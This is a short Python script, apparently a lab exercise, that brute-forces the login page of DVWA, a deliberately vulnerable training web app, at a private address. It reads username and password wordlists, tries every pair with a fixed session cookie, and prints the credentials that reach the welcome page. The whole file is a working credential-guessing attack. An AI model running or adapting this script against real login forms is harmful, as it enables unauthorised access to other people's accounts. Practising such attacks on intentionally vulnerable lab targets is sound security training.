import http.client, urllib.parse

lista_username = open("usernames.lst")
lista_password = open("passwords.lst")

user = lista_username.readlines() 
password = lista_password.readlines()

for usr in user:      
    usr = usr.rstrip()
    for pwd in password:

        pwd = pwd.rstrip()

        #print(usr, "-",pwd)

        conn = http.client.HTTPConnection("192.168.50.101",80)
        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':'Login#'}) 
        url_dvwa_bf = '/dvwa/vulnerabilities/brute/'
        url_target = url_dvwa_bf + '?' + post_parameters

        #print(url_target)

        phpsessionid = '83a8e15db70a9930b37187d21ab84451'
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':f'PHPSESSID={phpsessionid}'}  
        conn.request("GET", url_target, post_parameters, headers) 
        response = conn.getresponse()
        page_content = response.read().decode()
        if "Welcome to the password protected" in str(page_content):
            print(f"Accesso effettuato con username: '{usr}' - password: '{pwd}'")
        conn.close()
